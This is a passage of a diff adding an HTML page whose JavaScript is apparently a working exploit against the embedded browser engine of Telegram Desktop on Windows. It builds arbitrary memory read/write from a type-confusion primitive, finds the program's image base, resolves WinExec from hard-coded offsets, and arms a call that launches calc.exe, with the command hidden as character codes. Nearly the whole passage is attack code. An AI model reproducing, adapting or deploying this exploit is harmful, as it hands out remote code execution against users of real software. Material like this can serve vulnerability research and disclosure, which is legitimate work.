+  let v48 = 48, v49 = 49, v50 = 50, v51 = 51;
+  let v52 = 52, v53 = 53, v54 = 54, v55 = 55;
+  let v56 = 56, v57 = 57, v58 = 58, v59 = 59;
+  let v60 = 60, v61 = 61, v62 = 62, v63 = 63;
+
+  if (dormant) {
+    return () => [
+      v00, v01, v02, v03, v04, v05, v06, v07,
+      v08, v09, v10, v11, v12, v13, v14, v15,
+      v16, v17, v18, v19, v20, v21, v22, v23,
+      v24, v25, v26, v27, v28, v29, v30, v31,
+      v32, v33, v34, v35, v36, v37, v38, v39,
+      v40, v41, v42, v43, v44, v45, v46, v47,
+      v48, v49, v50, v51, v52, v53, v54, v55,
+      v56, v57, v58, v59, v60, v61, v62, v63,
+    ];
+  }
+
+  writer(fake);
+  const get = () => v00;
+  const set = value => v00 = value;
+  writer(0);
+  return [get, set];
+}
+
+function invokeVictim(writer, fake) {
+  return victim(writer, fake, false);
+}
+
+const parent = "A".repeat(4096);
+const slice = parent.slice(1, 4095);
+const pointerParent = "B".repeat(4096);
+const pointerSlice = pointerParent.slice(1, 4095);
+const fakeRope = "R".repeat(9000) + pointerSlice;
+const keep = [];
+let result = "primitive failed";
+
+for (let candidate = 0; candidate < writers.length; ++candidate) {
+  try {
+    const pair = invokeVictim(writers[candidate], slice);
+    keep.push(pair);
+    pair[1](4096);
+    pair[0]();
+    pair[1](0x100000);
+    if (parent.length !== 0x100000) continue;
+
+    const ropePair = invokeVictim(writers[candidate], fakeRope);
+    keep.push(ropePair);
+    ropePair[1](64);
+    let parentAddress = 0n;
+    for (let byte = 0; byte < 8; ++byte) {
+      parentAddress |= BigInt(pointerSlice.charCodeAt(byte)) << BigInt(byte * 8);
+    }
+
+    const targetAddress = parentAddress + 24n;
+    const addressBytes = [];
+    for (let byte = 0; byte < 8; ++byte) {
+      addressBytes.push(Number((targetAddress >> BigInt(byte * 8)) & 0xffn));
+    }
+    const addressString = String.fromCharCode(...addressBytes);
+    const arbitraryPair = invokeVictim(writers[candidate], addressString);
+    keep.push(arbitraryPair, addressString);
+    arbitraryPair[1](0x12345678);
+    const arbitraryRead = arbitraryPair[0]();
+
+    function leakValue(value) {
+      arbitraryPair[1](value);
+      const address = u64FromString(pointerParent);
+      arbitraryPair[1](0);
+      return address;
+    }
+
+    const typedArray = new Uint8Array(8);
+    const typedArrayObject = leakValue(typedArray);
+    const typedControlAddress = stringFromU64(typedArrayObject + 56n);
+    const typedControl = invokeVictim(writers[candidate], typedControlAddress);
+    keep.push(typedArray, typedControlAddress, typedControl);
+
+    function retarget(address) {
+      typedControl[1](u64ToFloat(address));
+    }
+
+    function readU32(address) {
+      retarget(address);
+      return (typedArray[0] | (typedArray[1] << 8) |
+        (typedArray[2] << 16) | (typedArray[3] << 24)) >>> 0;
+    }
+
+    function readU64(address) {
+      retarget(address);
+      let value = 0n;
+      for (let byte = 0; byte < 8; ++byte) {
+        value |= BigInt(typedArray[byte]) << BigInt(byte * 8);
+      }
+      return value;
+    }
+
+    retarget(targetAddress);
+    const pattern = [0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11];
+    for (let byte = 0; byte < 8; ++byte) typedArray[byte] = pattern[byte];
+    const typedWriteBack = readU64(targetAddress);
+
+    const nativeObject = leakValue(String.fromCharCode);
+    const nativeFunction = readU64(nativeObject + 56n);
+    let imageBase = nativeFunction & ~0xffffn;
+    let foundImage = false;
+    for (let page = 0; page < 4096; ++page, imageBase -= 0x10000n) {
+      if ((readU32(imageBase) & 0xffff) !== 0x5a4d) continue;
+      const peOffset = BigInt(readU32(imageBase + 0x3cn));
+      if (peOffset < 0x1000n && readU32(imageBase + peOffset) === 0x4550) {
+        foundImage = true;
+        break;
+      }
+    }
+    if (!foundImage) throw new Error("module base not found");
+
+    const peHeader = BigInt(readU32(imageBase + 0x3cn));
+    const imageSize = readU32(imageBase + peHeader + 0x50n);
+    const winExecCall = readU32(imageBase + 0x29a72b5n);
+    if (imageSize !== 0x0fb05000 || (winExecCall & 0xffff) !== 0x15ff)
+      throw new Error("unexpected Telegram Desktop image");
+
+    function writeBytes(address, bytes) {
+      retarget(address);
+      for (let byte = 0; byte < bytes.length; ++byte) {
+        typedArray[byte] = bytes[byte];
+      }
+    }
+
+    function writeU64(address, value) {
+      const bytes = [];
+      for (let byte = 0; byte < 8; ++byte) {
+        bytes.push(Number((value >> BigInt(byte * 8)) & 0xffn));
+      }
+      writeBytes(address, bytes);
+    }
+
+    const command = String.fromCharCode(
+      99, 97, 108, 99, 46, 101, 120, 101, 0);
+    const commandObject = leakValue(command);
+    const commandAddress = commandObject + 24n;
+
+    const recordDonor = [0, 0, 0, 0];
+    keep.push(command, recordDonor);
+    const donorObject = leakValue(recordDonor);
+    const recordAddress = readU64(donorObject + 56n);
+    writeU64(donorObject + 56n, 0n);
+    writeU64(donorObject + 64n, 0n);
+
+    const winExec = readU64(imageBase + 0x715c108n);
+    if (winExec < 0x10000n) throw new Error("WinExec import not resolved");
+    writeU64(recordAddress + 0n, 0n);
+    writeU64(recordAddress + 8n, 0n);
+    writeU64(recordAddress + 16n, commandAddress);
+    writeU64(recordAddress + 24n, winExec);
+
+    let launchObject = Object.create(null);
+    const launchAddress = leakValue(launchObject);
+    writeBytes(launchAddress + 18n, [16, 0]);
+    writeU64(launchAddress + 48n, recordAddress);
+
+    result = "candidate " + candidate + " base 0x" + imageBase.toString(16)
+      + " WinExec 0x" + winExec.toString(16) + " armed";
+    document.getElementById("out").textContent = result;
+    launchObject = null;
+
+    result = "candidate " + candidate + " heap 0x" + parentAddress.toString(16)
+      + " jsvalue 0x" + arbitraryRead.toString(16)
+      + " typed 0x" + typedWriteBack.toString(16)
+      + " native 0x" + nativeFunction.toString(16)
+      + " base 0x" + imageBase.toString(16) + " calc requested";
+    break;
+  } catch (error) {}
+}
+
+document.getElementById("out").textContent = result;
+</script></body></html>
+
+
+
